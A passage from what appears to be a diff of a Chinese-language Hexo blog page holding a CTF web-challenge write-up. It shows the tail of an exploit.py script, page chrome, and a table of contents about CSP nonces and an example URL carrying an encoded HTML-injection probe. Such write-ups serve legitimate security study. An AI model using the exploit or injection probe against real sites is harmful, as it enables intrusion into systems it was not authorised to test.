exploit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        CHALLENGE_HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/19/hack-lu-2019的部分web题解/" rel="next" title="hack.lu 2019的部分web题解">
+                <i class="fa fa-chevron-left"></i> hack.lu 2019的部分web题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-题目的目录结构如下："><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 题目的目录结构如下：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#app目录下："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">app目录下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#大体分析一下："><span class="nav-number">1.0.1.2.</span> <span class="nav-text">大体分析一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3行随机生成一个32位的字符串。"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">3行随机生成一个32位的字符串。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5行设置了页面的字符集防止页面乱码。"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">5行设置了页面的字符集防止页面乱码。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#6行设置页面的CSP，其中需要注意的是要在页面中执行javascript代码需要nonce的值相同。"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">6行设置页面的CSP，其中需要注意的是要在页面中执行javascript代码需要nonce的值相同。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#7-12行设置一些请求头，大家感兴趣的自行了解。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">7~12行设置一些请求头，大家感兴趣的自行了解。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#49行将会在页面中输出验证通过的地址后面的标签如：http-123-57-232-69-8080-index-php-123-57-232-69-3Ch1-3Etest-3C-h1-3E。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">49行将会在页面中输出验证通过的地址后面的标签如：http://123.57.232.69:8080/index.php#123.57.232.69%3Ch1%3Etest%3C/h1%3E。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其余没什么可以分析的了。"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">其余没什么可以分析的了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#cache目录下："><span class="nav-number">1.0.1.9.</span> <span class="nav-text">cache目录下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面大概介绍一下这个配置文件："><span class="nav-number">1.0.1.10.</span> <span class="nav-text">下面大概介绍一下这个配置文件：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#server目录下："><span class="nav-number">1.0.1.11.</span> <span class="nav-text">server目录下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker-compose-yml的内容如下："><span class="nav-number">1.0.1.12.</span> <span class="nav-text">docker-compose.yml的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后是exploit-py"><span class="nav-number">1.0.1.13.</span> <span class="nav-text">最后是exploit.py:</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">110k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
